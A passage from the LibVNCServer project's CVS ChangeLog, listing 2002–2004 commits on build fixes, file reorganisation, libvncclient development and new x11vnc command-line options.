	* libvncclient/rfbproto.c: recognize more encodings

2004-06-15  dscho <dscho>

	* libvncclient/sockets.c: debug

2004-06-15  dscho <dscho>

	* libvncserver/rfbserver.c: fix CoRRE with maxRectsPerUpdate bug

2004-06-15  dscho <dscho>

	* libvncclient/rfbproto.c: fix silly update bug with raw encoding

2004-06-12  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: -clear_mods -clear_keys -storepasswd, add RFB_SERVER_IP
	 RFB_SERVER_PORT to -accept/-gone

2004-06-08  dscho <dscho>

	* client_examples/Makefile.am, configure.ac: fix compilation on IRIX

2004-06-08  dscho <dscho>

	* configure.ac: fix test for sdl

2004-06-08  dscho <dscho>

	* client_examples/SDLvncviewer.c: fix compilation on MacOSX

2004-06-07  dscho <dscho>

	* index.html: layout and wording fix

2004-06-07  dscho <dscho>

	* index.html: more news

2004-06-07  dscho <dscho>

	* .cvsignore, prepare_x11vnc_dist.sh: now that it is released,
	increment x11vnc's version

2004-06-07  dscho <dscho>

	* .cvsignore, client_examples/.cvsignore, libvncclient/.cvsignore,
	libvncserver/.cvsignore, test/.cvsignore, x11vnc/.cvsignore: all
	this moving and renaming needs changes in the cvsignores, too!

2004-06-07  dscho <dscho>

	* libvncserver.spec.in => LibVNCServer.spec.in, Makefile.am,
	prepare_x11vnc_dist.sh: fix bug 968264: make rpm did not work with
	x11vnc package

2004-06-07  dscho <dscho>

	* client_examples/Makefile.am, client_examples/vnc2mpg.c,
	configure.ac: add vnc2mpg, a program which makes a movie from a VNC
	desktop using FFMPEG

2004-06-07  dscho <dscho>

	* TODO, client_examples/SDLvncviewer.c: added -encodings

2004-06-07  dscho <dscho>

	* ChangeLog, TODO, libvncserver/cursor.c, rfb/rfb.h: fix cursor
	trails (when not using cursor encoding and moving the cursor, the
	redrawn part of the screen didn't get updated, and so left cursor
	trails).

2004-06-07  dscho <dscho>

	* client_examples/SDLvncviewer.c: add mouse button handling

2004-06-07  dscho <dscho>

	* ChangeLog, Makefile.am, TODO, client_examples/Makefile.am,
	client_examples/SDLvncviewer.c, client_examples/ppmtest.c,
	configure.ac, contrib/Makefile.am, examples/Makefile.am,
	examples/blooptest.c, libvncclient/Makefile.am,
	libvncclient/client_test.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c, libvncserver/Makefile.am,
	prepare_x11vnc_dist.sh, rfb/rfbclient.h, test/Makefile.am,
	test/blooptest.c, {examples => test}/copyrecttest.c,
	test/tight-1.c, x11vnc/Makefile.am: add client_examples/, add
	SDLvncviewer, libvncclient API changes, suppress automake CFLAGS
	nagging

2004-06-06  runge <runge>

	* ChangeLog, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: rearrange file for easier maintenance, add RFB_CLIENT_COUNT
	 to -accept/-gone

2004-05-28  runge <runge>

	* x11vnc/x11vnc.c: [no log message]

2004-05-27  runge <runge>

	* ChangeLog, libvncserver/main.c, libvncserver/rfbserver.c,
	prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/x11vnc.c:  x11vnc: view-only plain passwd: -viewpasswd and 2nd line of
	 -passwdfile

2004-05-25  dscho <dscho>

	* prepare_x11vnc_dist.sh: a script which automatically converts a
	few files to make an x11vnc release

2004-05-25  dscho <dscho>

	* configure.ac: -lvncserver is not default now

2004-05-25  dscho <dscho>

	* ChangeLog, Makefile.am, configure.ac, contrib/Makefile.am,
	examples/Makefile.am, examples/regiontest.c,
	libvncclient/rfbproto.c, libvncserver/Makefile.am, auth.c =>
	libvncserver/auth.c, cargs.c => libvncserver/cargs.c,
	libvncserver/config.h, corre.c => libvncserver/corre.c, cursor.c =>
	libvncserver/cursor.c, cutpaste.c => libvncserver/cutpaste.c,
	d3des.c => libvncserver/d3des.c, d3des.h => libvncserver/d3des.h,
	draw.c => libvncserver/draw.c, font.c => libvncserver/font.c,
	hextile.c => libvncserver/hextile.c, httpd.c =>
	libvncserver/httpd.c, main.c => libvncserver/main.c,
	libvncserver/rfbconfig.h, rfbregion.c => libvncserver/rfbregion.c,
	rfbserver.c => libvncserver/rfbserver.c, rre.c =>
	libvncserver/rre.c, selbox.c => libvncserver/selbox.c, sockets.c =>
	libvncserver/sockets.c, stats.c => libvncserver/stats.c,
	tableinit24.c => libvncserver/tableinit24.c, tableinitcmtemplate.c
	=> libvncserver/tableinitcmtemplate.c, tableinittctemplate.c =>
	libvncserver/tableinittctemplate.c, tabletrans24template.c =>
	libvncserver/tabletrans24template.c, tabletranstemplate.c =>
	libvncserver/tabletranstemplate.c, tight.c => libvncserver/tight.c,
	translate.c => libvncserver/translate.c, vncauth.c =>
	libvncserver/vncauth.c, zlib.c => libvncserver/zlib.c, zrle.c =>
	libvncserver/zrle.c, zrleencodetemplate.c =>
	libvncserver/zrleencodetemplate.c, zrleoutstream.c =>
	libvncserver/zrleoutstream.c, zrleoutstream.h =>
	libvncserver/zrleoutstream.h, zrlepalettehelper.c =>
	libvncserver/zrlepalettehelper.c, zrlepalettehelper.h =>
	libvncserver/zrlepalettehelper.h, zrletypes.h =>
	libvncserver/zrletypes.h, test/Makefile.am, vncterm/Makefile.am,
	{contrib => x11vnc}/ChangeLog, x11vnc/Makefile.am, {contrib =>
	x11vnc}/x11vnc.c: move the library into libvncserver/, x11vnc into
	x11vnc/

2004-05-22  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c, httpd.c:  x11vnc: -gone, -passwdfile, -o logfile; add view-only to -accept

2004-05-14  runge <runge>

	* contrib/x11vnc.c:  x11vnc: more -inetd fixes.

2004-05-14  runge <runge>

	* contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: less fprintf under -q so '-q -inetd' has no stderr output.

2004-05-13  runge <runge>

	* contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: improvements to -accept popup: yes/no buttons and timeout.

2004-05-08  runge <runge>

	* contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: clean up -Wall warnings.

2004-05-08  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: add -accept some-command/xmessage/popup

2004-05-06  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: mouse -> keystroke and keystroke -> mouse remappings.

2004-05-05  dscho <dscho>

	* rfbserver.c, sockets.c: prevent segmentation fault when requested
	area is too big; if select is interrupted while WriteExact, just try
	again.

2004-04-28  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: add -auth, more -cursorpos and -nofb work

2004-04-20  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: add -cursorpos for Cursor Position Updates, and -sigpipe

2004-04-19  dscho <dscho>

	* main.c: ignore SIGPIPE the correct way

2004-04-13  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc: do not send selection unless all clients are in RFB_NORMAL
	 state.  increase rfbMaxClientWait when threaded to avoid
	ReadExact() timeouts for some viewers.

2004-04-12  dscho <dscho>

	* configure.ac: fix compilation without jpeg and a certain autoconf
	version

2004-04-08  runge <runge>

	* ChangeLog, configure.ac, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc options -blackout, -xinerama, -xwarppointer.  check cargs.   modify configure.ac to pick up -lXinerama

2004-03-24  dscho <dscho>

	* examples/pnmshow.c: add support for pgm and pbm (8-bit and 1-bit
	grayscale images)

2004-03-22  dscho <dscho>

	* ChangeLog, cargs.c, test/Makefile.am, test/cargstest.c: fix
	cargs.c: arguments were not correctly purged.

2004-03-15  dscho <dscho>

	* ChangeLog, libvncserver-config.in: fix --link for
	libvncserver-config

2004-03-11  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc options -vncconnect, -connect, -remap,  -debug_pointer, and -debug_keyboard  add reverse connections, keysym remapping,  and debug output option

2004-02-29  dscho <dscho>

	* index.html: link to pre.tar.gz, mention valgrind

2004-02-29  dscho <dscho>

	* index.html: update on news

2004-02-29  dscho <dscho>

	* ChangeLog, rfbregion.c: fixed valgrind warning

2004-02-20  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc options -nosel -noprimary -visual.   add clipboard/selection handling.   add visual option (mostly for testing and workarounds).   improve shm cleanup on failures.

2004-02-04  dscho <dscho>

	* AUTHORS, ChangeLog, examples/colourmaptest.c,
	examples/copyrecttest.c, examples/example.c, examples/simple.c,
	examples/simple15.c, examples/vncev.c: make examples g++
	compileable, thanks to Juan Jose Costello

2004-01-30  dscho <dscho>

	* ChangeLog, rfbserver.c: memory leaks fixed

2004-01-29  dscho <dscho>

	* ChangeLog, Makefile.am, configure.ac, tight.c, zlib.c, zrle.c,
	zrleencodetemplate.c, zrleoutstream.c, zrleoutstream.h,
	zrlepalettehelper.c, zrlepalettehelper.h: Honour the check for libz,
	libjpeg again

2004-01-21  dscho <dscho>

	* ChangeLog, cargs.c, main.c, rfb/rfb.h, rfbserver.c: add
	"-progressive height" option to make SendFramebufferUpdate
	"preemptive"

2004-01-21  dscho <dscho>

	* ChangeLog: update

2004-01-21  dscho <dscho>

	* examples/.cvsignore: ignore all test programs

2004-01-21  dscho <dscho>

	* examples/Makefile.am, examples/copyrecttest.c: add a simple
	example how to use rfbDoCopyRect

2004-01-21  dscho <dscho>

	* main.c, rfb/rfb.h: ignore SIGPIPE by default; it is handled via
	EPIPE

2004-01-21  dscho <dscho>

	* cursor.c: do not send unnecessary updated because of cursor
	drawing

2004-01-19  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  handle mouse button number mismatch  improved pointer input handling during drags, etc.   somewhat faster copy_tiles() -> copy_tiles()  x11vnc options -buttonmap -old_pointer -old_copytile

2004-01-19  dscho <dscho>

	* configure.ac: 0.6 is out... version is 0.7pre now

2004-01-19  dscho <dscho>

	* vncterm/Makefile.am: inherit CFLAGS

2004-01-19  dscho <dscho>

	* vncterm/VNConsole.c: fix usage of non-existent attribute buffer

2004-01-16  dscho <dscho>

	* ChangeLog, cargs.c, configure.ac, contrib/Makefile.am,
	rfbserver.c, vncauth.c: compile fix for cygwin

2004-01-10  runge <runge>

	* ChangeLog, contrib/ChangeLog, contrib/x11vnc.c:  x11vnc options -allow, -localhost, -nodragging, -input_skip  minimize memory usage under -nofb

2003-12-09  dscho <dscho>

	* libvncclient/hextile.c: fix compilation with Mac OSX: preprocessor
	can't do recursive macros

2003-12-09  runge <runge>

	* ChangeLog, configure.ac, contrib/ChangeLog, contrib/x11vnc.c: 
	x11vnc: XBell events, -nofb, -notruecolor, misc. cleaning

2003-11-27  dscho <dscho>

	* index.html: fixed link

2003-11-11  dscho <dscho>

	* ChangeLog, contrib/x11vnc.c: -inetd, -noshm and friends added

2003-11-07  dscho <dscho>

	* ChangeLog, README.cvs, configure.ac: release 0.6

2003-10-08  dscho <dscho>

	* zrle.c: fix gcc 2.x compilation: no C99

2003-09-11  markmc <markmc>

	* ChangeLog, Makefile.in, aclocal.m4, bootstrap.sh,
	classes/.cvsignore, classes/Makefile.in, config.h.in, configure,
	contrib/Makefile.in, depcomp, examples/Makefile.in, install-sh,
	libvncclient/Makefile.in, missing, mkinstalldirs, test/.cvsignore,
	test/Makefile.in, vncterm/Makefile.in: 2002-09-11  Mark McLoughlin
	<mark@skynet.ie>         * Makefile.in, */Makefile.in, aclocal.m4,           bootstrap.sh, config.h.in, configure,           depcomp, install-sh, missing, mkinstalldirs,         Removed auto-generated files from CVS.

2003-09-11  markmc <markmc>

	* ChangeLog, NEWS, rdr/Exception.h, rdr/FdInStream.cxx,
	rdr/FdInStream.h, rdr/FdOutStream.cxx, rdr/FdOutStream.h,
	rdr/FixedMemOutStream.h, rdr/InStream.cxx, rdr/InStream.h,
	rdr/MemInStream.h, rdr/MemOutStream.h, rdr/NullOutStream.cxx,
	rdr/NullOutStream.h, rdr/OutStream.h, rdr/ZlibInStream.cxx,
	rdr/ZlibInStream.h, rdr/ZlibOutStream.cxx, rdr/ZlibOutStream.h,
	rdr/types.h, zrle.cxx, zrleDecode.h, zrleEncode.h: 2003-09-11  Mark
	McLoughlin  <mark@skynet.ie>         * rdr/Exception.h, rdr/FdInStream.cxx, rdr/FdInStream.h,           rdr/FdOutStream.cxx, rdr/FdOutStream.h,
	          rdr/FixedMemOutStream.h, rdr/InStream.cxx, rdr/InStream.h,
	          rdr/MemInStream.h, rdr/MemOutStream.h, rdr/NullOutStream.cxx,
	          rdr/NullOutStream.h, rdr/OutStream.h, rdr/ZlibInStream.cxx,
	          rdr/ZlibInStream.h, rdr/ZlibOutStream.cxx, rdr/ZlibOutStream.h,
	          rdr/types.h, zrle.cxx, zrleDecode.h, zrleEncode.h: remove original         C++ ZRLE implementation. Its been ported to C.          * NEWS: copy the existing ChangeLog to here and make         this a more detailed ChangeLog.

2003-09-08  dscho <dscho>

	* AUTHORS, ChangeLog, Makefile.am, Makefile.in, autogen.sh,
	classes/Makefile.in, config.h.in, configure, configure.ac,
	contrib/Makefile.in, examples/Makefile.in,
	libvncclient/Makefile.in, rfb/rfb.h, rfb/rfbproto.h, rfbserver.c,
	test/Makefile.in, vncterm/Makefile.in, zrle.c,
	zrleencodetemplate.c, zrleoutstream.c, zrleoutstream.h,
	zrlepalettehelper.c, zrlepalettehelper.h, zrletypes.h: ZRLE no
	longer uses C++, but C

2003-08-29  dscho <dscho>

	* ChangeLog, Makefile.in, configure, configure.ac,
	libvncclient/Makefile.in, test/Makefile.in, vncterm/Makefile.in: 
	added --disable-cxx flag to configure

2003-08-18  dscho <dscho>

	* contrib/x11vnc.c: Karl Runge: 8bpp handling now much better,
	single window also, many improvements

2003-08-18  dscho <dscho>

	* httpd.c, main.c, rfbserver.c, sockets.c: socklen_t -> size_t

2003-08-18  dscho <dscho>

	* Makefile.in, aclocal.m4, classes/Makefile.in, config.h.in,
	contrib/Makefile.in, examples/Makefile.in, vncterm/Makefile.in: 
	using autoconf 1.6

2003-08-09  dscho <dscho>

	* README: added Projects section

2003-08-08  dscho <dscho>

	* .cvsignore, classes/.cvsignore, libvncclient/.cvsignore,
	test/.cvsignore: more files to ignore

2003-08-08  dscho <dscho>

	* libvncclient/rfbproto.c, libvncclient/tight.c,
	libvncclient/zlib.c, main.c, rfbserver.c: make --without-jpeg,
	--without-zlib work

2003-08-08  dscho <dscho>

	* AUTHORS, configure, configure.ac: add --without-jpeg,
	--without-zlib; repair --without-backchannel, --without-24bpp

2003-08-08  dscho <dscho>

	* httpd.c, sockets.c: handle EINTR after select()

2003-08-06  dscho <dscho>

	* ChangeLog, auth.c, contrib/x11vnc.c, examples/fontsel.c,
	examples/mac.c, httpd.c, main.c, rfb/rfb.h, rfbregion.c,
	rfbserver.c, rre.c, sockets.c, translate.c, vncterm/LinuxVNC.c,
	vncterm/VNCommand.c, zlib.c: rfbErr introduced

2003-08-03  dscho <dscho>

	* rfb/rfbproto.h: forgot to change WORDS_BIGENDIAN to
	LIBVNCSERVER_BIGENDIAN; #undef VERSION unneccessary...

2003-08-02  dscho <dscho>

	* config.h.in, configure, configure.ac: really check for setsid, not
	pgrp

2003-08-02  dscho <dscho>

	* main.c: overlooked endian config.h constant

2003-08-02  dscho <dscho>

	* config.h.in: required file

2003-08-01  dscho <dscho>

	* README, configure, configure.ac: mention NEWS in README, add
	checks for fork and setpgrp

2003-07-31  dscho <dscho>

	* ChangeLog: credit last two changes to Erik

2003-07-31  dscho <dscho>

	* main.c, rfb/rfb.h, sockets.c: rfbLog can be overridden; EINTR on
	read/write means just try again

2003-07-30  dscho <dscho>

	* Makefile.am, Makefile.in, rfb/rfb.h, rfb/rfbclient.h: add
	rfbclient.h to distribution; avoid C++ style comments

2003-07-30  dscho <dscho>

	* AUTHORS, ChangeLog, Makefile.in, NEWS, README, acinclude.m4,
	aclocal.m4, auth.c, cargs.c, classes/Makefile.in, configure,
	configure.ac, contrib/Makefile.in, contrib/x11vnc.c,
	contrib/zippy.c, corre.c, cursor.c, cutpaste.c, draw.c,
	examples/Makefile.in, examples/example.c, examples/mac.c,
	examples/pnmshow.c, examples/pnmshow24.c, examples/vncev.c, font.c,
	hextile.c, httpd.c, libvncclient/Makefile.in, libvncclient/corre.c,
	libvncclient/cursor.c, libvncclient/hextile.c,
	libvncclient/listen.c, libvncclient/rfbproto.c, libvncclient/rre.c,
	libvncclient/sockets.c, libvncclient/tight.c,
	libvncclient/vncviewer.c, libvncclient/zlib.c, main.c, rfb/rfb.h,
	rfb/rfbclient.h, rfb/rfbconfig.h.in, rfb/rfbproto.h,
	rfb/rfbregion.h, rfbregion.c, rfbserver.c, rre.c, selbox.c,
	sockets.c, stats.c, test/Makefile.in, tight.c, translate.c,
	vncauth.c, vncterm/LinuxVNC.c, vncterm/Makefile.in,
	vncterm/VNCommand.c, vncterm/VNConsole.c, vncterm/VNConsole.h,
	zlib.c, zrle.cxx: API change: Bool, KeySym, Pixel get prefix "rfb";
	constants in rfbconfig.h get prefix "LIBVNCSERVER_"

2003-07-29  dscho <dscho>

	* cursor.c, libvncclient/client_test.c, libvncclient/rfbproto.c,
	libvncclient/vncviewer.c, main.c, rfb/rfb.h, rfb/rfbclient.h,
	test/tight-1.c, tight.c: further valgrinding showed leaked mallocs

2003-07-28  dscho <dscho>

	* ChangeLog, README.cvs: adapted dox

2003-07-28  dscho <dscho>

	* libvncclient/Makefile: is autoconfed now

2003-07-28  dscho <dscho>

	* Makefile.am, Makefile.in, aclocal.m4, classes/Makefile.in,
	configure, configure.ac, contrib/Makefile.in, contrib/x11vnc.c,
	contrib/zippy.c, examples/1instance.c, examples/Makefile.in,
	examples/fontsel.c, examples/mac.c, examples/pnmshow.c,
	examples/pnmshow24.c, examples/vncev.c, libvncclient/Makefile,
	libvncclient/Makefile.am, libvncclient/Makefile.in,
	libvncclient/client_test.c, libvncclient/corre.c,
	libvncclient/listen.c, libvncclient/rfbproto.c, libvncclient/rre.c,
	libvncclient/sockets.c, libvncclient/tight.c,
	libvncclient/vncviewer.c, libvncclient/zlib.c, main.c,
	rdr/FdInStream.cxx, rdr/ZlibOutStream.cxx, rfb/rfb.h,
	rfb/rfbclient.h, rfb/rfbconfig.h.in, rfbregion.c, rfbserver.c,
	test/Makefile.am, test/Makefile.in, test/tight-1.c, tight.c,
	vncterm/LinuxVNC.c, vncterm/Makefile.in, vncterm/VNCommand.c,
	vncterm/VNConsole.c, vncterm/example.c: fixed maxRectsPerUpdate with
	Tight encoding bug; some autoconfing; stderr should not be used in a
	library (use rfbLog instead)

2003-07-28  dscho <dscho>

	* test/tight-1.c: first beginnings of automatic tests, thanks to
	libvncclient

2003-07-28  dscho <dscho>

	* ChangeLog, TODO, main.c, rfb/rfb.h, rfb/rfbregion.h, rfbregion.c,
	rfbserver.c, sockets.c, tight.c, vncauth.c: synced with TightVNC and
	RealVNC

2003-07-28  dscho <dscho>

	* Makefile.am, Makefile.in, examples/Makefile.am,
	examples/Makefile.in: debug flags

2003-07-27  dscho <dscho>

	* ChangeLog: libvncclient

2003-07-27  dscho <dscho>

	* libvncclient/Makefile, libvncclient/corre.c,
	libvncclient/cursor.c, libvncclient/hextile.c,
	libvncclient/listen.c, libvncclient/rfbproto.c, libvncclient/rre.c,
	libvncclient/sockets.c, libvncclient/tight.c,
	libvncclient/vncviewer.c, libvncclient/zlib.c, rfb/rfbclient.h,
	vncauth.c: first alpha version of libvncclient

2003-07-27  dscho <dscho>

	* rfb/rfb.h, rfb/rfbproto.h, vncauth.c: make vncauth usable also for
	upcoming libvncclient

2003-07-25  dscho <dscho>

	* ChangeLog, examples/.cvsignore, examples/Makefile.am,
	examples/Makefile.in, examples/simple.c, examples/simple15.c,
	index.html: Added simple examples

2003-07-11  dscho <dscho>

	* rfb/rfbconfig.h, rfb/rfbint.h: these files are generated by
	configure

2003-07-11  dscho <dscho>

	* ChangeLog, httpd.c: long standing bug in http; was sending .jar
	twice

2003-07-10  dscho <dscho>

	* INSTALL, Makefile.in, aclocal.m4, classes/Makefile.in, configure,
	contrib/Makefile.in, depcomp, examples/Makefile.in, install-sh,
	missing, mkinstalldirs, rfb/rfbconfig.h, rfb/rfbconfig.h.in,
	rfb/rfbint.h, rfb/stamp-h.in, vncterm/Makefile.in: another try to
	make CVS more helpful with configure

2003-07-10  dscho <dscho>

	* Makefile.am, classes/Makefile.am, configure.ac: also distribute
	classes/ directory

2003-07-10  dscho <dscho>

	* cargs.c: fix compile

2003-06-28  dscho <dscho>

	* ChangeLog, cargs.c: http options inserted

2003-05-05  dscho <dscho>

	* configure.ac: fix am__fastdepCXX for system not having ZLIB

2003-04-03  dscho <dscho>

	* contrib/ChangeLog: added ChangeLog for x11vnc

2003-04-03  dscho <dscho>

	* contrib/x11vnc.c: new version from Karl!

2003-02-28  dscho <dscho>

	* Makefile.am, configure.ac, libvncserver-config.in: let
	libvncserver-config behave as expected when called without
	installing

2003-02-27  dscho <dscho>

	* README.cvs: added some documentation how to compile from CVS
	sources

2003-02-21  dscho <dscho>

	* rfb/rfb.h: #include <rfb/rfbregion.h> instead of #include
	"rfbregion.h"

2003-02-20  dscho <dscho>

	* ChangeLog: update ChangeLog

2003-02-20  dscho <dscho>

	* index.html: #include <rfb/rfb.h> instead of "rfb.h"

2003-02-20  dscho <dscho>

	* contrib/Makefile.am, contrib/x11vnc.c, contrib/zippy.c,
	examples/Makefile.am, examples/colourmaptest.c, examples/example.c,
	examples/fontsel.c, examples/mac.c, examples/pnmshow.c,
	examples/pnmshow24.c, examples/storepasswd.c, examples/vncev.c,
	libvncserver-config.in, vncterm/Makefile.am, vncterm/VNConsole.h: 
	the correct way to include rfb.h is now "#include <rfb/rfb.h>"

2003-02-19  dscho <dscho>

	* index.html: webpage update

2003-02-19  dscho <dscho>

	* rfb/.cvsignore: forgotten .cvsignore

2003-02-19  dscho <dscho>

	* Makefile.am: fixed header installation into $(prefix)/include/rfb

2003-02-18  dscho <dscho>

	* Makefile.am, configure.ac, include/.cvsignore, {include =>
	rfb}/default8x16.h, {include => rfb}/keysym.h, {include =>
	rfb}/rfb.h, {include => rfb}/rfbproto.h, {include =>
	rfb}/rfbregion.h: moved include/ to rfb/

2003-02-18  dscho <dscho>

	* sockets.c: fixed a bug when closing a client if no longer
	listening for new clients.

2003-02-17  dscho <dscho>

	* cursor.c, include/rfb.h: export rfbReverseBytes; undefine VERSION,
	because it's too common

2003-02-17  dscho <dscho>

	* INSTALL: INSTALL is copied by automake

2003-02-17  dscho <dscho>

	* INSTALL: INSTALL was missing

2003-02-16  dscho <dscho>

	* configure.ac, libvncserver-config.in: fixed --link option to
	libvncserver-config

2003-02-10  dscho <dscho>

	* cvs_update_anonymously, include/rfbproto.h: cvs more flexible now;
	ZRLE encoding only when HAVE_ZRLE defined

2003-02-10  dscho <dscho>

	* ChangeLog, rfbserver.c: really fixed ClientConnectionGone problem

2003-02-10  dscho <dscho>

	* vncterm/LinuxVNC.c, vncterm/VNConsole.c: fixed LinuxVNC colours

2003-02-10  dscho <dscho>

	* main.c, rfbserver.c: fixed a bug that prevented the first
	connection to be closed

2003-02-10  dscho <dscho>

	* include/rfb.h: fixed pthread debugging (locks...)

2003-02-10  dscho <dscho>

	* contrib/Makefile.am, examples/Makefile.am, vncterm/Makefile.am: 
	fixed dependecy to libvncserver.a; if the lib is newer, the programs
	are relinked

2003-02-10  dscho <dscho>

	* go: removed superfluous file

2003-02-10  dscho <dscho>

	* examples/.cvsignore, examples/Makefile.am,
	examples/colourmaptest.c, vncterm/VNConsole.c: added
	colourmapexample; fixed LinuxVNC to show the right colours

2003-02-09  dscho <dscho>

	* ChangeLog: vncterm imported, porting issues solved (IRIX, OS X,
	Solaris)

2003-02-09  dscho <dscho>

	* configure.ac, examples/Makefile.am, examples/mac.c,
	vncterm/Makefile.am, vncterm/VNCommand.c: support for OS X is better
	now

2003-02-09  dscho <dscho>

	* configure.ac, examples/Makefile.am: trying again to support OS X

2003-02-09  dscho <dscho>

	* Makefile.am, configure.ac, examples/.cvsignore,
	vncterm/.cvsignore, vncterm/ChangeLog, vncterm/LinuxVNC.c,
	vncterm/Makefile.am, vncterm/README, vncterm/TODO,
	vncterm/VNCommand.c, vncterm/VNConsole.c, vncterm/VNConsole.h,
	vncterm/example.c, vncterm/vga.h: included vncterm

2003-02-09  dscho <dscho>

	* .cvsignore, configure.ac, mac.c => examples/mac.c: moved the
	OSXvnc-server to examples; IRIX fixes (not really IRIX, but shows
	there)

2003-02-09  dscho <dscho>

	* Makefile.am, examples/Makefile.am, examples/regiontest.c,
	examples/sratest.c, sraRegion.h => include/rfbregion.h, main.c,
	sraRegion.c => rfbregion.c, rfbserver.c, translate.c: renamed
	sraRegion to rfbregion and put it in include/; will be installed now

2003-02-09  dscho <dscho>

	* ChangeLog: portability changes

2003-02-09  dscho <dscho>

	* configure.ac: order of X libraries is not good for IRIX

2003-02-09  dscho <dscho>

	* configure.ac, main.c: include order was wrong

2003-02-09  dscho <dscho>

	* Makefile.in, configure, contrib/Makefile.in, examples/Makefile.in: 
	source from CVS always will need a current autoconf/automake

2003-02-09  dscho <dscho>

	* Makefile.in, acinclude.m4, configure, contrib/Makefile.in,
	examples/Makefile.in: I give up supporting old autoconf/automake;
	now require at least 2.52

2003-02-09  dscho <dscho>

	* acinclude.m4: more macros included for older autoconf/automake

2003-02-09  dscho <dscho>

	* Makefile.am, TODO, acinclude.m4, auth.c, configure.ac,
	contrib/x11vnc.c, corre.c, cursor.c, cutpaste.c, hextile.c,
	httpd.c, include/.cvsignore, include/rfb.h, include/rfbproto.h,
	main.c, rfbserver.c, rre.c, sockets.c, sraRegion.c, stats.c,
	tableinit24.c, tableinitcmtemplate.c, tableinittctemplate.c,
	tabletrans24template.c, tabletranstemplate.c, tight.c, translate.c,
	vncauth.c, zlib.c, zrle.cxx: converted CARD{8,16,32} to
	uint{8,16,32}_t and included support for stdint.h

2003-02-09  dscho <dscho>

	* .cvsignore: ignore libvncserver-config

2003-02-09  dscho <dscho>

	* configure.ac, include/rfb.h, main.c: bigendian is now determined
	at configure time

2003-02-09  dscho <dscho>

	* index.html: added website

2003-02-09  dscho <dscho>

	* Makefile.am, configure.ac: small adjustments for autoconf/automake
	compatibility

2003-02-09  dscho <dscho>

	* Makefile.am, configure.ac, contrib/Makefile.am,
	examples/Makefile.am, examples/vncev.c, libvncserver-config.in,
	libvncserver.spec.in: make dist fixed; make rpm introduced

2003-02-08  dscho <dscho>

	* .cvsignore, Makefile, bootstrap.sh, contrib/.cvsignore,
	contrib/Makefile, examples/.cvsignore, examples/Makefile: removed
	Makefiles; these are generated now

2003-02-08  dscho <dscho>

	* .cvsignore, contrib/.cvsignore, examples/.cvsignore,
	libvncserver.spec.in: ignore generated files

2003-02-08  dscho <dscho>

	* contrib/.cvsignore, examples/.cvsignore, examples/blooptest.c,
	examples/sratest.c, include/.cvsignore: missing files

2003-02-08  dscho <dscho>

	* AUTHORS, CHANGES => ChangeLog, NEWS, TODO: further autoconf'ing

2003-02-08  dscho <dscho>

	* Makefile, Makefile.am, TODO, bootstrap.sh, configure.ac,
	contrib/Makefile, contrib/Makefile.am, examples/Makefile,
	examples/Makefile.am, examples/example.c, include/rfb.h,
	include/rfbproto.h, main.c, rfbserver.c, sockets.c, tight.c,
	zlib.c, zrle.cc => zrle.cxx: autoconf'ed everything

2003-02-07  dscho <dscho>

	* examples/.cvsignore, examples/radon.h: added files

2003-02-07  dscho <dscho>

	* cvs_update_anonymously, examples/Makefile: added Makefile in
	examples; "export" in cvs_update_anonymously

2003-02-07  dscho <dscho>

	* Makefile, contrib/Makefile, contrib/zippy.c, 1instance.c =>
	examples/1instance.c, examples/pnmshow24.c, default8x16.h =>
	include/default8x16.h, keysym.h => include/keysym.h, rfb.h =>
	include/rfb.h, rfbproto.h => include/rfbproto.h, main.c, radon.h: 
	moved files to include; moved a file to examples/

2003-02-07  dscho <dscho>

	* CHANGES, example.c => examples/example.c, example.dsp =>
	examples/example.dsp, fontsel.c => examples/fontsel.c, pnmshow.c =>
	examples/pnmshow.c, pnmshow24.c => examples/pnmshow24.c,
	storepasswd.c => examples/storepasswd.c, vncev.c =>
	examples/vncev.c: moved files to contrib/ and examples/

2002-12-30  dscho <dscho>

	* CHANGES, cargs.c: fixed cargs (segmentation fault!)

2002-12-25  dscho <dscho>

	* contrib/x11vnc.c: strange, but standard X11 behaviour from Sun
	keymappings...

2002-12-20  dscho <dscho>

	* contrib/x11vnc.c: include commented debug functionality

2002-12-20  dscho <dscho>

	* contrib/x11vnc.c: AltGr fixes in x11vnc, renamed from altgr to
	modtweak

2002-12-20  dscho <dscho>

	* Makefile: fixed compilation for zippy

2002-12-20  dscho <dscho>

	* contrib/Makefile: Makefile for contrib

2002-12-19  dscho <dscho>

	* contrib/x11vnc.c, contrib/zippy.c: new version of x11vnc from Karl
	Runge

2002-12-15  dscho <dscho>

	* contrib/x11vnc.c: small fixes: in X11/Xlib.h Bool is int (Karl
	Runge); indexed colour support

2002-12-15  dscho <dscho>

	* Makefile, rfbserver.c: fix: if no CXX is defined, really don't use
	zrle (Karl Runge)

2002-12-06  dscho <dscho>

	* CHANGES, Makefile, contrib/x11vnc.c, zippy.c => contrib/zippy.c,
	httpd.c, main.c, rfb.h, x11vnc.c: compiler warnings, contrib
	directory, new x11vnc from Karl Runge

2002-10-29  dscho <dscho>

	* CHANGES, main.c, rfbserver.c: fixed severe bug with sending
	fbupdates

2002-10-29  dscho <dscho>

	* CHANGES, README, cursor.c, main.c, rfb.h, rfbproto.h,
	rfbserver.c, stats.c: patch from Const for CursorPosUpdate encoding

2002-10-22  dscho <dscho>

	* rdr/Exception.h, rdr/FdInStream.cxx, rdr/FdInStream.h,
